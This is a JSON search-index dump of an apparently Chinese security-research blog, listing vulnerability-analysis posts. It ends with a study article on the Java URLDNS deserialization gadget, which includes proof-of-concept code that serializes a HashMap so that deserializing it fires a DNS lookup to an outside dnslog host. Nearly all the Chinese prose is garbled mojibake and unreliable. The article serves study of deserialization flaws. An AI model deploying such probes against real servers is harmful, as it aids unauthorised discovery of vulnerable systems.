[{"uri":"https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/","title":"Java Deserialization","tags":[],"description":"","content":"javaååºåˆ—åŒ– java ååºåˆ—åŒ–ç ”ç©¶\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/encoding/","title":"Encoding","tags":[],"description":"","content":"ç¼–ç  ç¼–ç ç›¸å…³çš„æ–‡ç« \nUnicode utf-7 "},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/codeql/","title":"Codeql","tags":[],"description":"","content":"CODEQL ç›¸å…³ è®°å½•codeql å­¦ä¹  è®°å½•codeql å­¦ä¹ \n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/linux/malware/","title":"Malware","tags":[],"description":"","content":"æ¶æ„è½¯ä»¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/","title":"Windows CLFS EoP","tags":[],"description":"","content":"Windows CLFS æ¼æ´æ¦‚è§ˆ åºå· æ¼æ´å ç¼–å· ç±»å‹ 2 windows CLFS æƒé™æå‡æ¼æ´ CVE-2023-28252 æƒé™æå‡ 1 windows CLFS æƒé™æå‡æ¼æ´ CVE-2022-37969 æƒé™æå‡ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/linux/","title":"Linux","tags":[],"description":"","content":"Linux Linux ç›¸å…³ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/","title":"Windows","tags":[],"description":"","content":"windows Windows ç›¸å…³ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/ntlm/","title":"NTLM åè®®","tags":[],"description":"","content":"NTLM åè®® "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/","title":"åè®®","tags":[],"description":"","content":"åè®® "},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/","title":"Web","tags":[],"description":"","content":"Web web Webå®‰å…¨ç ”ç©¶ç›¸å…³\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/","title":"ä»£ç å®¡è®¡","tags":[],"description":"","content":"ä»£ç å®¡è®¡ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/kerberos-in-windows/","title":"Windowsä¸­çš„kerberosåè®®","tags":[],"description":"","content":"Windowsä¸­çš„Kerberosåè®® "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/","title":"Kerberos åè®®","tags":[],"description":"","content":"kerberosåè®®ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/dll-inject/","title":"Dllæ³¨å…¥","tags":[],"description":"","content":"Dllæ³¨å…¥ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/socks/","title":"Socksåè®®","tags":[],"description":"","content":"Socks åè®® "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/","title":"éš§é“","tags":[],"description":"","content":"éš§é“ éš§é“ç›¸å…³æ–‡ç« \n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/","title":"åº”ç”¨å±‚éš§é“","tags":[],"description":"","content":"åº”ç”¨å±‚éš§é“ "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/","title":"ä¼ è¾“å±‚éš§é“","tags":[],"description":"","content":"ä¼ è¾“å±‚éš§é“ "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/network-layer/","title":"ç½‘ç»œå±‚éš§é“","tags":[],"description":"","content":"ç½‘ç»œå±‚éš§é“ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/","title":"å®‰å…¨ç ”ç©¶","tags":[],"description":"","content":"å®‰å…¨ç ”ç©¶ è®°å½•å®‰å…¨ç ”ç©¶ç›¸å…³æ–‡ç« \n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/pe/","title":"Pe","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/","title":"æ¼æ´åˆ†æ","tags":[],"description":"","content":"æ¼æ´åˆ†æ ä¸€äº›æ¼æ´åˆ†ææ–‡ç« ã€‚\nåºå· æ¼æ´å ç¼–å· ç±»å‹ çŠ¶æ€ 42 â˜ 41 40 39 38 37 36 35 Wordpress Backup Migration plugin RCE CVE-2023-6553 ä»£ç æ‰§è¡Œ âœ“ 34 AFP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-23121 ä»£ç æ‰§è¡Œ âœ“ 33 windows NTLM æƒé™æå‡æ¼æ´ CVE-2023-21746 æƒé™æå‡ âœ— 32 Apache Struts è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2023-50164 ä»£ç æ‰§è¡Œ âœ“ 31 Apache Struts OGNL è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-17530 ä»£ç æ‰§è¡Œ âœ“ 30 Linux polkit æƒé™æå‡æ¼æ´ CVE-2021-4034 æƒé™æå‡ âœ“ 29 Windows äº‘æ–‡ä»¶è¿·ä½ è¿‡æ»¤é©±åŠ¨æƒé™æå‡æ¼æ´ CVE-2023-36036 æƒé™æå‡ âœ“ 28 wordpad ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2023-36563 ä¿¡æ¯æ³„éœ² âœ“ 27 squid æ‹’ç»æœåŠ¡æ¼æ´ QVD-2023-30699 æ‹’ç»æœåŠ¡ âœ“ 26 Citrix Gateway ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2023-4966 ä¿¡æ¯æ³„éœ² âœ“ 25 http2 å¿«é€Ÿé‡ç½®æ”»å‡» CVE-2023-44487 æ‹’ç»æœåŠ¡ âœ“ 24 curlå †æº¢å‡ºæ¼æ´ CVE-2023-38545 æ‹’ç»æœåŠ¡ âœ“ 23 ç‘å‹å¤©ç¿¼ è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ QVD-2023-8621 ä»£ç æ‰§è¡Œ âœ“ 22 libwebp è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2023-4863 ä»£ç æ‰§è¡Œ âœ— 21 jumpserver ä»»æ„å¯†ç é‡ç½®æ¼æ´ CVE-2023-42820 å¯†ç é‡ç½® âœ“ 20 Winrar ä»£ç æ‰§è¡Œæ¼æ´ CVE-2023-38831 ä»£ç æ‰§è¡Œ âœ“ 19 windows é”™è¯¯æŠ¥å‘ŠæœåŠ¡ä»£ç æ‰§è¡Œæ¼æ´ CVE-2023-36874 æƒé™æå‡ âœ“ 18 Windows ICS æƒé™æå‡æ¼æ´ CVE-2023-38148 ä»£ç æ‰§è¡Œ âœ“ 17 Cirtix Gateway RCE CVE-2023-3519 ä»£ç æ‰§è¡Œ âœ“ 16 Openfire èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ CVE-2023-32315 èº«ä»½è®¤è¯ç»•è¿‡ âœ“ 15 Smartbi RCE QVD-2023-5326 ä»£ç æ‰§è¡Œ âœ“ 14 Windows CLFS æƒé™æå‡æ¼æ´ç³»åˆ— æƒé™æå‡ âœ— 13 gitlab ç›®å½•ç©¿è¶Šæ¼æ´ CVE-2023-2825 ä¿¡æ¯æ³„éœ² âœ“ 12 zero logonåˆ†æ CVE-2020-1472 æƒé™æå‡ âœ“ 11 windows http.sys æƒé™æå‡æ¼æ´ CVE-2023-23410 æƒé™æå‡ âœ“ 10 TerraMaster TOSä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-24990 ä»£ç æ‰§è¡Œ âœ— 9 PgAdmin ä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-4223 ä»£ç æ‰§è¡Œ âœ“ 8 sudoæƒé™æå‡æ¼æ´ CVE-2021-3156 æƒé™æå‡ âœ— 7 Minioä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2023-28432 ä¿¡æ¯æ³„éœ² âœ“ 6 Strapi ä»£ç æ‰§è¡Œæ¼æ´é“¾ ä»£ç æ‰§è¡Œ âœ— 5 Outlook æƒé™æå‡æ¼æ´ CVE-2023-23397 æƒé™æå‡ âœ“ 4 OWASSRF å’Œ TabShellåˆ†æ CVE-2022-41080 CVE-2022-41076 ä»£ç æ‰§è¡Œ âœ— 3 proxy not shell æ¼æ´é“¾ CVE-2022-41040 CVE-2022-41082 ä»£ç æ‰§è¡Œ âœ— 2 proxy shell æ¼æ´é“¾ CVE-2021-34473 CVE-2021-34523 CVE-2021-31207 ä»£ç æ‰§è¡Œ âœ— 1 win32k æƒé™æå‡æ¼æ´ CVE-2021-40449 æƒé™æå‡ âœ“ "},{"uri":"https://www.ch35tnut.site/zh-cn/","title":"é¦–é¡µ","tags":[],"description":"","content":"å­¦ä¹ è®°å½• è®°å½•ä¸€äº›å¹³æ—¶å­¦ä¹ å’Œç”Ÿæ´»çš„æ—¥å¸¸ã€‚\n01-05è‡³01-08\r| 3 days ago\rç ”ç©¶äº†ä¸€ä¸‹JAVAçš„URL DNSåŸç†ã€‚\nJAVA URL DNSç ”ç©¶ 2024\r12-29è‡³12-29\r| 10 days ago\rå¡«å‘\nwindows CLFS æƒé™æå‡æ¼æ´ CVE-2022-37969 windows CLFS æƒé™æå‡æ¼æ´ CVE-2023-28252 Wordpress Backup Migration plugin RCE 2023\r12-05è‡³12-06\r1 day | 34 days ago\råˆ†æäº†CVE-2021-4034 polkit æƒé™æå‡æ¼æ´ï¼Œå¡«å‘ã€‚\npolkit æƒé™æå‡æ¼æ´ 2023\r11-30è‡³12-01\r1 day | 39 days ago\råˆ†æäº†CVE-2023-17530 Apache Struts OGNL è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´\nApache Struts OGNL è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ 2023\r11-20è‡³11-25\r5 days | 49 days ago\råˆ†æäº†åœ¨é‡åˆ©ç”¨çš„ CVE-2023-36036 Windows Cloud Files Mini Filter Driver æƒé™æå‡æ¼æ´\nWindows Cloud Files Mini Filter Driver æƒé™æå‡æ¼æ´ 2023\r10-31è‡³11-01\r1 day | 69 days ago\råˆ†æäº†åœ¨é‡åˆ©ç”¨çš„wordpad ä¿¡æ¯æ³„éœ²æ¼æ´\nwordpad ä¿¡æ¯æ³„éœ²æ¼æ´ 2023\r10-19è‡³10-25\r6 days | 81 days ago\råˆ†æäº†ä¸¤ä¸ªæ¼æ´\nCitrix ä¿¡æ¯æ³„éœ²æ¼æ´ squid æ‹’ç»æœåŠ¡æ¼æ´ 2023\r10-14è‡³10-15\r1 day | 86 days ago\rå¤ç°åˆ†æäº†curl å †æº¢å‡ºæ¼æ´\ncurlå †æº¢å‡ºæ¼æ´ 2023\r10-12è‡³10-13\r1 day | 88 days ago\rå¤ç°åˆ†æäº†http2 å¿«é€Ÿé‡ç½®æ”»å‡»\nhttp rapid reset ddos attack 2023\r09-19è‡³09-19\r| 111 days ago\ræŠŠä¹‹å‰å†™çš„æ–‡ç« æ•´ç†åˆ°äº†åšå®¢\nwindows é”™è¯¯æŠ¥å‘ŠæœåŠ¡æƒé™æå‡æ¼æ´ winrar ä»£ç æ‰§è¡Œæ¼æ´ 2023\r09-14è‡³09-18\r4 days | 116 days ago\råˆ†æäº†ä»¥ä¸‹9æœˆè¡¥ä¸æ—¥çš„CVE-2023-38148, åˆ†ææ–‡ç« ï¼š\nwindows ics rce 2023\r07-24è‡³07-27\r3 days | 168 days ago\rå‰å‡ å¤©æ­å»ºCitrix ADCç¯å¢ƒï¼Œå®åœ¨æ˜¯å¤ªéš¾æ­äº†ï¼Œæœ€åè¿˜æ˜¯é€‰æ‹©ä»å…¬ç½‘æ‰¾äº†ä¸ªç¯å¢ƒæ‰“äº†ä¸€ä¸‹payloadï¼Œdiffäº†ä»¥ä¸‹è¡¥ä¸ï¼Œå†™äº†ä¸€ä¸ªåˆ†æï¼Œå¯æƒœä¸èƒ½æœ¬åœ°è°ƒè¯•ï¼Œçœ‹èµ·æ¥å†™expåº”è¯¥æŒºç®€å•çš„ã€‚åˆ†æè§\ncitrix adc rce æ›´æ–°ï¼šæ­å»ºäº†è°ƒè¯•ç¯å¢ƒï¼Œè°ƒè¯•äº†ä¸€ä¸‹ï¼Œæ›´æ–°åœ¨åŸé“¾æ¥\n2023\r09-13è‡³09-16\r3 days | 482 days ago\rè¿™å‘¨å†å†™ä¸€ä¸ªåŸºäºrustçš„loaderï¼Œå†™äº†ä¸€åŠå‘ç°åŠ è½½çš„dllå¤ªå¤šäº†ï¼Œå†æƒ³åŠæ³•ç”¨åŠ¨æ€åŠ è½½çš„æ–¹å¼åŠ è½½dllï¼Œæ„Ÿè§‰ç”¨ruståšæœ‰ç‚¹éš¾ã€‚\nç”¨rustçš„å†…è”æ±‡ç¼–è·å–åˆ°äº†kernel32.dllå’Œntdll.dllçš„åŸºå€ï¼Œè¿˜è¦ç»§ç»­å®Œå–„ã€‚\n2022\r09-10è‡³09-12\r2 days | 485 days ago\rä¸­ç§‹èŠ‚ï¼Œåœ¨å®¶æ‘¸äº†å‡ å¤©ğŸŸï¼Œå•¥éƒ½æ²¡å¹²\n2022\r09-05è‡³09-09\r4 days | 490 days ago\rè¿™å‘¨ç¼–è¯‘äº†wireshark 1.8.5ï¼Œé€šè¿‡diff1.8.5å’Œ1.8.6çš„æºç æ‰¾å‡º1.8.5é‡Œé¢çš„æ¼æ´ï¼Œè§\nwireshark 1.8.5ä»£ç å®¡è®¡ 2022\r09-03è‡³09-04\r1 day | 492 days ago\rè¿™ä¸¤å¤©ï¼Œç»™hugoä¸»é¢˜å¢åŠ äº†timelineçš„shortcodeï¼Œè§\nå¢åŠ timelineåŠŸèƒ½ 2022\r08-29è‡³09-02\r4 days | 497 days ago\rå‘¨å†…çœ‹äº†ä¸€ä¸ªå‡ ç™¾è¡Œçš„ä»£ç ï¼Œè§\rnews_serverå®¡è®¡\n2022\ré»‘å®¢ç²¾ç¥ï¼šOpen, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/dailylife/","title":"ç”Ÿæ´»éšç¬”","tags":[],"description":"","content":"ç”Ÿæ´»éšç¬” è®°å½•ä¸€äº›éšç¬”æ–‡ç« ã€‚\n2023å¹´ç»ˆæ€»ç»“å’Œ2024å±•æœ› "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/","title":"æ‚é¡¹","tags":[],"description":"","content":"æ‚é¡¹ æš‚æ— \n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/","title":"å…¶ä»–","tags":[],"description":"","content":"å…¶ä»– "},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/","title":"JAVA URL DNS ç ”ç©¶","tags":["å®‰å…¨ç ”ç©¶","ååºåˆ—åŒ–"],"description":"","content":"å‰è¨€\nåˆæ­¥å…¥é—¨javaååºåˆ—åŒ–å­¦ä¹ ï¼Œåšä¸€ä¸ªå­¦ä¹ è®°å½•ï¼Œæ°´ä¸€ç¯‡æ–‡ç« ã€‚å¦‚æœæœ‰é—®é¢˜å¯ä»¥é‚®ä»¶ï¼šgot_\rwhipper.0p@icloud.com\nURLç±»DNSè¯·æ±‚ ä½¿ç”¨URL.equalsä¼šå‘èµ·DNSè¯·æ±‚\npublic class urltest { public static void main(String[] args) throws MalformedURLException { System.out.println(\u0026#34;hello \u0026#34;); URL u = new URL(\u0026#34;http://www.baidu.com\u0026#34;); URL u1 = new URL(\u0026#34;http://www.baidu.com\u0026#34;); System.out.println(u.equals(u1)); } } è·Ÿè¿›ä»£ç ï¼Œequalsä»£ç å¦‚ä¸‹ï¼Œ\nprotected boolean equals(URL u1, URL u2) { String ref1 = u1.getRef(); String ref2 = u2.getRef(); return (ref1 == ref2 || (ref1 != null \u0026amp;\u0026amp; ref1.equals(ref2))) \u0026amp;\u0026amp; sameFile(u1, u2); } åˆ¤æ–­referenceæ˜¯å¦ç›¸åŒï¼Œè€Œåä½¿ç”¨sameFileå‡½æ•°ï¼ŒsameFileå‡½æ•°ä¼šæŸ¥çœ‹å…¶åè®®ã€uriã€ç«¯å£ã€ä¸»æœºæ˜¯å¦ç›¸ç­‰ã€‚\nprotected boolean sameFile(URL u1, URL u2) { // Compare the protocols. if (!((u1.getProtocol() == u2.getProtocol()) || (u1.getProtocol() != null \u0026amp;\u0026amp; u1.getProtocol().equalsIgnoreCase(u2.getProtocol())))) return false; // Compare the files. if (!(u1.getFile() == u2.getFile() || (u1.getFile() != null \u0026amp;\u0026amp; u1.getFile().equals(u2.getFile())))) return false; // Compare the ports. int port1, port2; port1 = (u1.getPort() != -1) ? u1.getPort() : u1.handler.getDefaultPort(); port2 = (u2.getPort() != -1) ? u2.getPort() : u2.handler.getDefaultPort(); if (port1 != port2) return false; // Compare the hosts. if (!hostsEqual(u1, u2)) return false; return true; } hostsEqualæ–¹æ³•ä¸­ä¼šè°ƒç”¨getHostAddressæ–¹æ³•ï¼ŒgetHostAddressæ–¹æ³•ä¼šé€šè¿‡InetAddress.getByNameå‡½æ•°è·å–åˆ°åŸŸåå¯¹åº”çš„IPåœ°å€ï¼Œè§¦å‘DNSè§£æ\nprotected boolean hostsEqual(URL u1, URL u2) { InetAddress a1 = getHostAddress(u1); InetAddress a2 = getHostAddress(u2); protected synchronized InetAddress getHostAddress(URL u) { if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.isEmpty()) { return null; } else { try { u.hostAddress = InetAddress.getByName(host); } catch (UnknownHostException ex) { return null; } catch (SecurityException se) { return null; } } return u.hostAddress; } åŒæ ·çš„URLç±»ä¸­çš„hashCodeä¹Ÿä¼šè§¦å‘DNSè¯·æ±‚ï¼Œé€šè¿‡getHostAddressè·å–åˆ°IPåœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å…¶ä¸­hashCodeä¼šè¢«ç¼“å­˜\npublic synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) { h += addr.hashCode(); } else { String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); } é€šè¿‡è°ƒç”¨URLç±»çš„equalså’ŒhashCodeæ–¹æ³•å³å¯è§¦å‘DNSè¯·æ±‚\nHashMapåŸç† æ•°æ®ç»“æ„\nHashMapé‡‡ç”¨æ•°ç»„+é“¾è¡¨æ–¹å¼å­˜å‚¨é”®å€¼å¯¹ï¼Œå…¶ä¸­é“¾è¡¨ä¸ºå•å‘é“¾è¡¨\ntransient Node\u0026lt;K,V\u0026gt;[] table; static class Node\u0026lt;K,V\u0026gt; implements Map.Entry\u0026lt;K,V\u0026gt; { final int hash; final K key; V value; Node\u0026lt;K,V\u0026gt; next; Node(int hash, K key, V value, Node\u0026lt;K,V\u0026gt; next) { this.hash = hash; this.key = key; this.value = value; this.next = next; } é»˜è®¤æƒ…å†µä¸‹javaä¸­çš„HashMapå¤§å°åªæœ‰16ï¼Œå½“äº§ç”Ÿhashå†²çªæ—¶ï¼Œå°±æŠŠå®ƒæ’å…¥åˆ°é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œåœ¨å–å‡ºå…ƒç´ æ—¶ï¼Œé¦–å…ˆè®¡ç®—hashï¼Œæ ¹æ®hashæ‰¾åˆ°å¯¹åº”çš„é“¾è¡¨ï¼Œè€Œåéå†é“¾è¡¨è·å–åˆ°valueã€‚\nstatic final int DEFAULT_INITIAL_CAPACITY = 1 \u0026lt;\u0026lt; 4; å¯ä»¥ç”¨å¦‚ä¸‹å›¾ HashMapé‡å†™äº†readObjectæ–¹æ³•ï¼Œååºåˆ—åŒ–HashMapæ•°æ®æ—¶ä¼šè°ƒç”¨é‡å†™çš„readObjectæ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹\nprivate void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); else if (mappings \u0026gt; 0) { // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } å¯ä»¥çŸ¥é“ï¼ŒreadObjectæ–¹æ³•ä¼šè·å–æœ‰å¤šå°‘ä¸ªæ•°æ®ï¼Œè€Œåè¿›è¡Œé€šè¿‡forå¾ªç¯å¾ªç¯ä»æ•°æ®æµä¸­è¯»å–å¯¹è±¡ä¿¡æ¯ï¼Œå¹¶é€šè¿‡putValæ–¹æ³•åŠ å…¥åˆ°HashMapä¸­ï¼Œå…¶ä¸­é”®ä¸ºhash(key)ï¼Œä¹Ÿå°±æ˜¯ä¼šå°è¯•è°ƒç”¨keyå¯¹åº”ç±»çš„hashCodeæ–¹æ³•è®¡ç®—hashå€¼ã€‚\nstatic final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } å¦‚æœkeyå¯¹è±¡ä¸ºURLç±»ï¼Œé€šè¿‡å‰é¢æˆ‘ä»¬çŸ¥é“URL.hashCodeæ–¹æ³•ä¼šè§¦å‘DNSè¯·æ±‚ï¼Œè¿™ä¹Ÿæ˜¯URLDNSçš„åŸç†ã€‚\nä»¥ä¸Šä»£ç æ¥æºäºJDK 12.0.1\nhttps://cloud.tencent.com/developer/article/1167574\nhttps://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3\nå®é™…æµ‹è¯•\nä½¿ç”¨å¦‚ä¸‹ä»£ç è¿›è¡Œæµ‹è¯•\npublic class urltest { public static void main(String[] args) throws IOException, ClassNotFoundException { System.out.println(\u0026#34;hello \u0026#34;); URL u = new URL(\u0026#34;http://www.baidu.com/1\u0026#34;); URL u1 = new URL(\u0026#34;http://www.aliyun.com/1\u0026#34;); HashMap\u0026lt;URL,String\u0026gt; map = new HashMap\u0026lt;URL,String\u0026gt;(); map.put(u,\u0026#34;1\u0026#34;); map.put(u1,\u0026#34;1\u0026#34;); FileOutputStream fos = new FileOutputStream(\u0026#34;object\u0026#34;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()æ–¹æ³•å°†myObjå¯¹è±¡å†™å…¥objectæ–‡ä»¶ os.writeObject(map); os.close(); //ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡ FileInputStream fis = new FileInputStream(\u0026#34;object\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); //æ¢å¤å¯¹è±¡ HashMap map2 = (HashMap\u0026lt;URL,String\u0026gt;)ois.readObject(); System.out.println(\u0026#34;finish\u0026#34;); ois.close(); } } å®é™…æµ‹è¯•åœ¨ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–æ¢å¤HashMapå¯¹è±¡æ—¶ä¸ä¼šè§¦å‘DNSæŸ¥è¯¢ï¼Œè·Ÿè¿›HashMapçš„readObjectï¼Œæœ‰å¦‚ä¸‹\nfor (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } å…¶ä¸­å¯¹Kå°è¯•è°ƒç”¨readObjectæ–¹æ³•ååºåˆ—åŒ–å‡ºå¯¹åº”çš„å¯¹è±¡ï¼Œå…¶ä¼šè°ƒç”¨åˆ°URLç±»çš„readObjectæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°URLçš„readObjectæ–¹æ³•ä¼šå°è¯•è¯»å–åˆ°hashCodeå¹¶æ”¾å…¥å¯¹è±¡çš„hashCodeå±æ€§\nprivate synchronized void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { GetField gf = s.readFields(); String protocol = (String)gf.get(\u0026#34;protocol\u0026#34;, null); if (getURLStreamHandler(protocol) == null) { throw new IOException(\u0026#34;unknown protocol: \u0026#34; + protocol); } String host = (String)gf.get(\u0026#34;host\u0026#34;, null); int port = gf.get(\u0026#34;port\u0026#34;, -1); String authority = (String)gf.get(\u0026#34;authority\u0026#34;, null); String file = (String)gf.get(\u0026#34;file\u0026#34;, null); String ref = (String)gf.get(\u0026#34;ref\u0026#34;, null); int hashCode = gf.get(\u0026#34;hashCode\u0026#34;, -1); if (authority == null \u0026amp;\u0026amp; ((host != null \u0026amp;\u0026amp; !host.isEmpty()) || port != -1)) { if (host == null) host = \u0026#34;\u0026#34;; authority = (port == -1) ? host : host + \u0026#34;:\u0026#34; + port; } tempState = new UrlDeserializedState(protocol, host, port, authority, file, ref, hashCode); } è€Œåœ¨åºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨HashMap.putæ–¹æ³•ï¼Œputæ–¹æ³•ä¼šè·Ÿå‰é¢ä¸€æ ·ï¼Œè°ƒç”¨hashæ–¹æ³•è®¡ç®—hashCodeï¼Œå¹¶æ”¾åˆ°å¯¹è±¡å†…ï¼Œåºåˆ—åŒ–æ—¶hashCodeå°±è¢«ä¿å­˜äº†ã€‚\npublic V put(K key, V value) { return putVal(hash(key), key, value, false, true); } ä½¿å¾—åœ¨è°ƒç”¨URL.readObjectæ–¹æ³•æ—¶èƒ½å¤Ÿè·å–åˆ°hashCodeï¼Œä¸ä¼šè¿›è¡ŒDNSè§£æã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜å°±å¾—è®©åºåˆ—åŒ–åçš„æ•°æ®hashCodeä¸º-1æ‰èƒ½è®©hashCodeæ–¹æ³•è°ƒç”¨åˆ°getHostAddressæ–¹æ³•ã€‚ å®¹æ˜“æƒ³åˆ°ä¸¤ç§åŠæ³•\nåœ¨putåï¼Œä¿®æ”¹æ•°æ®ï¼ŒæŠŠhashCodeå¯¹åº”çš„æ•°æ®ç½®ä¸º-1ï¼Œè€Œåè¿›è¡Œåºåˆ—åŒ– åœ¨æ•°æ®æ”¾å…¥HashMapæ—¶ï¼Œé€šè¿‡åå°„ç›´æ¥è°ƒç”¨putValå¹¶æŠŠç¬¬ä¸€ä¸ªå‚æ•°è®¾ä¸º-1 ä»¥ä¸‹æ˜¯ä¸¤ç§åŠæ³•çš„å®ç°ï¼Œ\ræ¥æºäº public class URLDNS { public static void main(String[] args) throws Exception { HashMap\u0026lt;URL, Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://su18.dnslog.cn\u0026#34;); Field f = Class.forName(\u0026#34;java.net.URL\u0026#34;).getDeclaredField(\u0026#34;hashCode\u0026#34;); f.setAccessible(true); f.set(url, 0x01010101); hashMap.put(url, 0); f.set(url, -1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;urldns.bin\u0026#34;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;urldns.bin\u0026#34;)); ois.readObject(); } } public class URLDNS2 { public static void main(String[] args) throws Exception { HashMap\u0026lt;URL, Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://su18.dnslog.cn\u0026#34;); Method[] m = Class.forName(\u0026#34;java.util.HashMap\u0026#34;).getDeclaredMethods(); for (Method method : m) { if (method.getName().equals(\u0026#34;putVal\u0026#34;)) { method.setAccessible(true); method.invoke(hashMap, -1, url, 0, false, true); } } ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;urldns2.bin\u0026#34;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;urldns2.bin\u0026#34;)); ois.readObject(); } } ysoserial å®ç°URL DNS ä¸‹è½½\ræºç ,URLDNSå®ç°å¦‚ä¸‹ï¼Œå¾ˆæ˜æ˜¾é‡‡ç”¨çš„æ—¶ç¬¬ä¸€ç§æ–¹æ³•ï¼Œåœ¨putä¹‹åï¼Œé€šè¿‡åå°„ä¿®æ”¹å¯¹åº”çš„å€¼ã€‚\npublic class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler 